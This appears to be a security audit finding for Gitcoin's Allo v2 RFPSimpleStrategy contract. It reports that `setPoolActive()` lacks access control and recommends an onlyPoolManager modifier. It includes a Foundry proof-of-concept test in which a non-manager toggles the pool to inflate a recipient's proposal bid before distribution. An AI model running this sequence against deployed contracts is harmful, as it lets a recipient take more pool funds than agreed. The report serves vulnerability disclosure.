# No access control on `setPoolActive()` can result last minute change of proposal bid

The function [`setPoolActive()`](https://github.com/sherlock-audit/2023-09-Gitcoin/blob/6430c8004017e96ae2f5aac365bdefd0b6eeea72/allo-v2/contracts/strategies/rfp-simple/RFPSimpleStrategy.sol#L219) in the RFPSimpleStrategy contract lacks access control allowing anyone to set `poolActive` to `true` or `false`.

## Vulnerability Detail

Each strategy inherit the [`baseStrategy`](https://github.com/sherlock-audit/2023-09-Gitcoin/blob/6430c8004017e96ae2f5aac365bdefd0b6eeea72/allo-v2/contracts/strategies/BaseStrategy.sol#L30) contract which has a private variable `poolActive`.

In the RFPSimpleStrategy, this variable determine if registering is still open or if we can pick a `recipient` as well as distribute or withdraw funds. By not putting an access control on the `setPoolActive()` function, it allows any user to temporarly disable some functions of the contract as well as being able to register even if the `reicipient`has been set.

Because we can still register, it means an accepted recipient could increase its proposal bid right before the pool manager distribute rewards for a milestone, thus earning more than he was supposed to be. Max being the `poolAmount`.

## Impact

High. 
- Can temporarily disable some functions of the contract and make calls revert.
- The accepted recipient could frontrun the `distribute()` call by the pool manager and update its `proposalBid` to receive more tokens.

## Code Snippet

Here is a POC that can be copy pasted in the RFPSimpleStrategy test file.

```solidity
function test_update_recipient_proposalBid() public {
        //Fund pool with 2 ether
        vm.deal(pool_admin(), 2 ether);
        vm.prank(pool_admin());
        allo().fundPool{value: 2 ether}(poolId, 2 ether);

        //register with 1e17 wei and allocate to a recipient
        address sender = recipient();
        Metadata memory metadata = Metadata({protocol: 1, pointer: "metadata"});

        bytes memory data = abi.encode(recipientAddress(), false, 1e17, metadata);
        vm.prank(address(allo()));
        address recipientId = strategy.registerRecipient(data, sender);
        __setMilestones();
        vm.prank(address(allo()));
        strategy.allocate(abi.encode(recipientId), address(pool_admin()));

        //pool is now active = false and we got accepted as recipient
        IStrategy.Status recipientStatus = strategy.getRecipientStatus(recipientId);
        assertEq(uint8(recipientStatus), uint8(IStrategy.Status.Accepted));
        assertEq(strategy.isPoolActive(), false);

        //anyone can set pool active
        vm.prank(makeAddr("not_pool_manager"));
        strategy.setPoolActive(true);

        //update the recipient with a higher proposalBid
        metadata = Metadata({protocol: 1, pointer: "metadata"});

        //increase from 1e17 to 1e18 wei our proposal bid
        data = abi.encode(recipientAddress(), false, 1e18, metadata);
        vm.prank(address(allo()));
        recipientId = strategy.registerRecipient(data, sender);

        //set pool back to false so distribute don't revert
        vm.prank(makeAddr("not_pool_manager"));
        strategy.setPoolActive(false);

        //distribute
        vm.prank(address(allo()));
        strategy.distribute(new address[](0), "", pool_admin());
    }
```

## Recommendation

Add `onlyPoolManager(msg.sender)` modifier to the function.
